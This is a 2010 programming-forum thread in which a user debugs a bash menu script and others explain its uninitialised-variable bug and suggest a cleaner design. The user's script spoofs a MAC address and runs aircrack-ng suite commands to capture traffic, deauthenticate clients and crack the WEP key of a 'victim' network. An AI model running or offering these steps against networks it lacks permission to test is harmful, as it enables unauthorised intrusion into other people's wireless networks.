---
title: "Script problem - semibeginner"
date: 2010-02-20
forum: Programming Talk
---

### Post by hakermania on 2010-02-20
Hello all!
I've written a script.This is what is was supposed to do:
First of all, the user has to give his interface by typing "7".
when the interface was specified the program would start from the beginning asking for another number.This program works fine till this stage. Unfortunately, when I am giving for example 1, the program "airmon-ng" runs but it misbehaves.That means that wrong info have been given to it, although the interface I 've given to 7 are right. For example, I give to 7 "wlan0". A file named wlan0_DAT which includes the word "wlan0" is created in /home/alex/Documents/hakforothers/.Then the program reruns.I give it "1".The program airmon-ng starts normally but it gives errors. That means that the final given command wasn't "airmon-ng start wlan0" as it was supposed to be but something else. Now, if I push "2" it says:
"cat: /home/alex/Documents/hakforothers/_DAT: No such file or directory"  
Where do I do wrong? Here is my code:
```
num1="1"
num2="2"
num3="3"
num4="4"
num5="5"
num6="6"
num7="7"
echo
echo "Type what you wanna do..."
echo "1= Start interface   2= Stop interface   3= See your mac"
echo "4= Change your mac   5= Hack WEP......   6= Hack WPA...."
echo "IF YOU RUN FIRST TIME --> 7= Say which is your interface"
read number
if [ "$number" == "$num1" ]; then

	int=`cat /home/alex/Documents/hakforothers/${int}_DAT`
airmon-ng start $int
/home/alex/Desktop/hakfile
elif [ "$number" == "$num2" ]; then
 
	int=`cat /home/alex/Documents/hakforothers/${int}_DAT`
airmon-ng stop $int
/home/alex/Desktop/hakfile
elif [ "$number" == "$num3" ]; then

	int=`cat /home/alex/Documents/hakforothers/${int}_DAT`
macchanger -s $int
/home/alex/Desktop/hakfile
elif [ "$number" == "$num4" ]; then
 
	int=`cat /home/alex/Documents/hakforothers/${int}_DAT`
macchanger -m 00:11:22:33:44:55 $int
/home/alex/Desktop/hakfile
elif [ "$number" == "$num5" ]; then
exit
elif [ "$number" == "$num6" ]; then
exit
elif [ "$number" == "$num7" ]; then
if [ -s /home/alex/Documents/script/${USERNAME}_DAT ]; then
echo "interface already mentioned.You can change it by editing /home/alex/Documents/hakforothers/*file*"
/home/alex/Desktop/hakfile
else
echo "Type your interface.Do not do any mistakes.Be careful"
read int
echo $int > /home/alex/Documents/hakforothers/${int}_DAT
/home/alex/Desktop/hakfile
fi
fi
```
Thx in advance for any answers!

---

### Post by hakermania on 2010-02-20
Any help??

---

### Post by pbrane on 2010-02-20
When you say 'Then the program reruns', what do you mean exactly? Do you manually rerun the script from the terminal? Or does the script include a loop that you don't show here? 

If you are manually re-running the script then the variable *'int'* is not being initialized. The only initialization of *'int'* is in the *num7* case. *int* is supposed to be the interface you entered in case 7 and you are using it in *${int}_DAT* uninitialized. Which is why you get that error:
*"cat: /home/alex/Documents/hakforothers/_DAT: No such file or directory" *

---

### Post by dwhitney67 on 2010-02-20
I think we would be better off discussing whether the egg came first or the chicken.

Look at this statement:
```

int=`cat /home/alex/Documents/hakforothers/${int}_DAT`

```
It appears that you want to get the interface that is stored in a file, that alas, is named after the same interface.  What the flock??

How do you expect to read a file, using a variable of ${int} if you don't even know the interface yet?


P.S.  Why not just write your script so that it takes command line argument, which in your case, should be the NIC interface alias?

---

### Post by Leppie on 2010-02-20
> **dwhitney67 said:**
> It appears that you want to get the interface that is stored in a file, that alas, is named after the same interface.  What the flock??
he's going to hack it... :P

---

### Post by hakermania on 2010-02-21
But, guys...
When somebody runs the program must push 7 and give his interface. Then if the user select soomething else, the interface will be captured from the already given /home/alex/Documents/hakforothers/${int}_DAT. When I say the program reruns I mean that runs again because of the "/home/alex/Desktop/hakfile" that is in the end of every selection...

---

### Post by hakermania on 2010-02-21
Hm....Solved....In a way.......I recreated my script:

```
#!/bin/sh
while :;do echo "
Type what you wanna do...(8=exit)
1= Start charerface   2= Stop interface   3= See your mac
4= Change your mac   5= Hack WEP......   6= Hack WPA....
IF YOU RUN FIRST TIME --> 7= Say which is your interface"
read number
        case $number in
                1)
                        char=`cat /home/alex/Documents/hakforothers/${char}_DAT`
                        airmon-ng start $char;;
                2)
                        char=`cat /home/alex/Documents/hakforothers/${char}_DAT`
			echo
                        airmon-ng stop $char;;
                3)
                        char=`cat /home/alex/Documents/hakforothers/${char}_DAT`
			echo
                        macchanger -s $char;;
                4)
                        char=`cat /home/alex/Documents/hakforothers/${char}_DAT`
			echo
                        macchanger -m 00:11:22:33:44:55 $char;;
                5)	
			while :;do echo "
Type what do you want to do to hack WEP...(8=exit)
1= Become root	2= Start capturing IVS	3= Send deAth to broadcast
4= Start reading files	5= Start aircrack-ng	6=Back to main menu";
			read want1;
			case $want1 in
				1)
					su;;
				2)
					echo "Type victim's channel:"
					read channel
					char=`cat /home/alex/Documents/hakforothers/${char}_DAT`				
					airodump-ng -w nethack -i $char -c $channel;;
				3)	
	`				echo "Victim's mac address?"
					read mac
					char=`cat /home/alex/Documents/hakforothers/${char}_DAT`
					aireplay-ng -0 1 -a $mac -h 00:11:22:33:44:55 $char;;
				4)
					echo "Victim's mac?"
					read mac
					char=`cat /home/alex/Documents/hakforothers/${char}_DAT`
					aireplay-ng -3 -b $mac -h 00:11:22:33:44:55 $char;;
				5)	
					echo "Type path to file or file"
					read path
					aircrack-ng -a 1 -0 -n 128 $path;;
				6)exit;;
				
				8)
					exit; exit;;	
				*)
					echo "Error, try again!"				
			esac

				done
                6)	exit;;        
                7)	echo "Type your interface plz:"
			read char
                        echo $char > /home/alex/Documents/hakforothers/${char}_DAT;;
		8)	echo "Exiting. . ."; clear; exit;;

                *)
                        echo "[$number] wrong option, try again !";;
        esac
done 
```

Now it says "./hakfile: 71: Syntax error: EOF in backquote substitution"
 although my program has only 70 lines.
I don't know if I used "case" correctly in case 5 (hack wep) :S

---

### Post by dwhitney67 on 2010-02-21
You're not too bright; I already discussed earlier what the issue is, and you have yet to correct for it.  Now, on top of that, you have a syntax error.

Forget the saving the interface name to a data file; it will not buy you anything worthwhile.  If you insist on it, then at least rename the file such that it does not include the interface name within the filename.

Do you understand?  Your two choices are:

1.  Do not create a DAT file whatsoever; or
2.  Create the file, but do not name it as '${char}_DAT'; name it instead 'interface_DAT'.

As mentioned earlier, if the user selects a number other than 7, you will NOT know the value of ${char}, thus making it impossible for you to open the file, and thus making it impossible for you to know which interface the user entered previously when they chose option 7.

Why not just write the script so that the user must ALWAYS provide the interface via the command line??  For example:

```

#!/bin/bash

function doOne()
{
   echo interface given is $1
}

function doTwo()
{
   echo interface given is $1
}

function doThree()
{
   echo interface given is $1
}

function illegalOption()
{
   echo "The option entered is not recognized; try again."
}


# main entry point
#
if [ $# -ne 1 ]      # ensure the user enters the desired interface from the command line
then
        echo "Usage: $0 <interface>"
        exit -1
fi

done=false

while [ $done == false ]
do
        echo
        echo "Please select an option from the menu:"
        echo
        echo "   1.  Do option 1"
        echo "   2.  Do option 2"
        echo "   3.  Do option 3"
        echo "   q.  Quit"

        read option

        case "$option" in
                "1")   doOne $1;;
                "2")   doTwo $1;;
                "3")   doThree $1;;
                "q")   done=true ;;
                *)     illegalOption;;
        esac
done

exit 0

```

---

